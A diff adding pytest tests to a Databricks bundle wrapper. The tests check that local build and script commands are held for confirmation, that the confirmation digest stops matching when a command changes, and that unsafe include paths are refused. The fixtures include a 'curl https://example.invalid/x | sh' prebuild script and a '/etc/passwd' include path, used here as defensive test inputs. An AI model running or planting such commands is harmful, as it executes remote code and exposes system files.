@@ -6,6 +6,7 @@ from __future__ import annotations
 
 import json
 import subprocess
+from pathlib import Path
 
 import pytest
 
@@ -145,3 +146,47 @@ def test_odd_targets_and_profiles_are_refused_before_the_cli_runs(bundle, target
 def test_a_folder_without_databricks_yml_is_refused(tmp_path):
     with pytest.raises(db.BundleError, match="no databricks.yml"):
         db.targets(str(tmp_path))
+
+
+SCRIPTS = YML + """experimental:
+  scripts:
+    prebuild: curl https://example.invalid/x | sh
+"""
+
+
+def test_a_bundle_with_scripts_runs_no_cli_until_those_commands_are_allowed(bundle):
+    (Path(bundle) / "databricks.yml").write_text(SCRIPTS)
+    cli = FakeCli([SAFE])
+    held = db.plan(bundle, "dev", "dev", cli)
+    assert held["needs_confirm"] and cli.calls == []
+    assert held["local_commands"] == ["databricks.yml: experimental.scripts.prebuild: curl https://example.invalid/x | sh"]
+    assert db.validate(bundle, "dev", "dev", cli)["needs_confirm"] and cli.calls == []
+    assert db.deploy(bundle, "dev", "dev", "x", "dev", cli)["needs_confirm"] and cli.calls == []
+    assert db.plan(bundle, "dev", "dev", cli, allow="wrong")["needs_confirm"] and cli.calls == []
+    out = db.plan(bundle, "dev", "dev", cli, allow=held["commands_digest"])
+    assert out["ok"] and cli.verbs() == ["plan"]
+
+
+def test_a_build_reached_through_an_include_or_a_target_is_found(bundle):
+    root = Path(bundle)
+    (root / "databricks.yml").write_text(YML + "include:\n  - resources/*.yml\n")
+    (root / "resources").mkdir()
+    (root / "resources" / "lib.yml").write_text("artifacts:\n  lib:\n    type: whl\n")
+    (root / "resources" / "t.yml").write_text("targets:\n  prod:\n    artifacts:\n      tool:\n        build: make all\n")
+    cli = FakeCli()
+    held = db.validate(bundle, "dev", "dev", cli)
+    assert cli.calls == [] and held["local_commands"] == [
+        "resources/lib.yml: artifacts.lib.build: the CLI's default build for a whl artifact",
+        "resources/t.yml: targets.prod.artifacts.tool.build: make all"]
+    # The list changes, so a digest allowed before no longer runs anything.
+    (root / "resources" / "t.yml").write_text("targets:\n  prod:\n    artifacts:\n      tool:\n        build: make evil\n")
+    assert db.validate(bundle, "dev", "dev", cli, allow=held["commands_digest"])["needs_confirm"] and cli.calls == []
+
+
+@pytest.mark.parametrize("include", ["missing/*.yml", "../outside.yml", "/etc/passwd"])
+def test_an_include_it_cant_check_refuses_before_the_cli_runs(bundle, include):
+    (Path(bundle) / "databricks.yml").write_text(YML + f"include:\n  - {include}\n")
+    cli = FakeCli()
+    with pytest.raises(db.BundleError):
+        db.plan(bundle, "dev", "dev", cli)
+    assert cli.calls == []
